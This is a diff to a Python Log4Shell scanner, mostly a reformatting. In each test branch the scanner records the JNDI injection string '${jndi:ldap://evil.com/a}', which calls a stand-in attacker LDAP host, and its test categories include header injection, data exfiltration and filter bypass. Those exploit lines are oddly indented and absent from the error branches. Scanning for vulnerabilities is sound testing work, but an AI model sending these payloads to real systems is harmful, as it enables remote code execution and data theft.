@@ -16,6 +16,7 @@ Fluxo:
   4. Classifica: vulnerable, blocked, error
   5. Retorna resultado consolidado com severidade
 """
+
 import argparse
 import logging
 import secrets
@@ -102,29 +103,37 @@ async def _test_jndi_basic(
                 vulnerable = True
                 details = "Possivel log4j detectado na resposta"
 
-            results.append(Log4ShellAttempt(
-            exploit="${jndi:ldap://evil.com/a}",
-            tool="log4j-scan",
-                technique=technique,
-                category="jndi_basic",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=resp.status_code,
-                size=len(resp.content),
-                vulnerable=vulnerable,
-                details=details,
-                error="",
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    exploit="${jndi:ldap://evil.com/a}",
+                    tool="log4j-scan",
+                    technique=technique,
+                    category="jndi_basic",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=resp.status_code,
+                    size=len(resp.content),
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
         except httpx.RequestError as e:
-            results.append(Log4ShellAttempt(
-                technique=technique,
-                category="jndi_basic",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    technique=technique,
+                    category="jndi_basic",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=0,
+                    size=0,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
     return results
 
 
@@ -155,29 +164,37 @@ async def _test_jndi_obfuscated(
                 vulnerable = True
                 details = "Ofuscado payload refletido no body"
 
-            results.append(Log4ShellAttempt(
-            exploit="${jndi:ldap://evil.com/a}",
-            tool="log4j-scan",
-                technique=technique,
-                category="jndi_obfuscated",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=resp.status_code,
-                size=len(resp.content),
-                vulnerable=vulnerable,
-                details=details,
-                error="",
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    exploit="${jndi:ldap://evil.com/a}",
+                    tool="log4j-scan",
+                    technique=technique,
+                    category="jndi_obfuscated",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=resp.status_code,
+                    size=len(resp.content),
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
         except httpx.RequestError as e:
-            results.append(Log4ShellAttempt(
-                technique=technique,
-                category="jndi_obfuscated",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    technique=technique,
+                    category="jndi_obfuscated",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=0,
+                    size=0,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
     return results
 
 
@@ -212,29 +229,37 @@ async def _test_header_injection(
                 vulnerable = True
                 details = f"Token via {header_name} encontrado"
 
-            results.append(Log4ShellAttempt(
-            exploit="${jndi:ldap://evil.com/a}",
-            tool="log4j-scan",
-                technique=technique,
-                category="header_injection",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=resp.status_code,
-                size=len(resp.content),
-                vulnerable=vulnerable,
-                details=details,
-                error="",
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    exploit="${jndi:ldap://evil.com/a}",
+                    tool="log4j-scan",
+                    technique=technique,
+                    category="header_injection",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=resp.status_code,
+                    size=len(resp.content),
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
         except httpx.RequestError as e:
-            results.append(Log4ShellAttempt(
-                technique=technique,
-                category="header_injection",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    technique=technique,
+                    category="header_injection",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=0,
+                    size=0,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
     return results
 
 
@@ -265,29 +290,37 @@ async def _test_data_exfil(
                 vulnerable = True
                 details = f"Exfil payload refletido via {header_name}"
 
-            results.append(Log4ShellAttempt(
-            exploit="${jndi:ldap://evil.com/a}",
-            tool="log4j-scan",
-                technique=technique,
-                category="data_exfil",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=resp.status_code,
-                size=len(resp.content),
-                vulnerable=vulnerable,
-                details=details,
-                error="",
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    exploit="${jndi:ldap://evil.com/a}",
+                    tool="log4j-scan",
+                    technique=technique,
+                    category="data_exfil",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=resp.status_code,
+                    size=len(resp.content),
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
         except httpx.RequestError as e:
-            results.append(Log4ShellAttempt(
-                technique=technique,
-                category="data_exfil",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    technique=technique,
+                    category="data_exfil",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=0,
+                    size=0,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
     return results
 
 
@@ -318,35 +351,44 @@ async def _test_bypass(
                 vulnerable = True
                 details = f"Bypass payload refletido via {header_name}"
 
-            results.append(Log4ShellAttempt(
-            exploit="${jndi:ldap://evil.com/a}",
-            tool="log4j-scan",
-                technique=technique,
-                category="bypass",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=resp.status_code,
-                size=len(resp.content),
-                vulnerable=vulnerable,
-                details=details,
-                error="",
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    exploit="${jndi:ldap://evil.com/a}",
+                    tool="log4j-scan",
+                    technique=technique,
+                    category="bypass",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=resp.status_code,
+                    size=len(resp.content),
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
         except httpx.RequestError as e:
-            results.append(Log4ShellAttempt(
-                technique=technique,
-                category="bypass",
-                header_name=header_name,
-                payload=payload,
-                token=_get_token(),
-                status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
-            ))
+            results.append(
+                Log4ShellAttempt(
+                    technique=technique,
+                    category="bypass",
+                    header_name=header_name,
+                    payload=payload,
+                    token=_get_token(),
+                    status=0,
+                    size=0,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
     return results
 
 
 @dataclass(frozen=True, slots=True)
 class Log4ShellAttempt:
     """Tentativa individual de Log4Shell."""
+
     technique: str
     category: str
     header_name: str
@@ -364,6 +406,7 @@ class Log4ShellAttempt:
 @dataclass(frozen=True, slots=True)
 class Log4ShellResult:
     """Resultado consolidado do scan de Log4Shell."""
+
     target: str
     tls: bool
     attempts: list[Log4ShellAttempt]
@@ -458,7 +501,8 @@ async def run_scan(
         print_results(result)
         logger.info(
             "Log4Shell scan concluido: %d testes, %d vulneraveis",
-            len(all_attempts), len(vuln_techs),
+            len(all_attempts),
+            len(vuln_techs),
         )
 
         if output_file:
@@ -496,7 +540,8 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("url", help="URL alvo para o scan")
     parser.add_argument(
-        "-c", "--category",
+        "-c",
+        "--category",
         default="all",
         choices=["all", "jndi_basic", "jndi_obfuscated", "header_injection", "data_exfil", "bypass"],
         help="Categoria de testes (default: todas)",
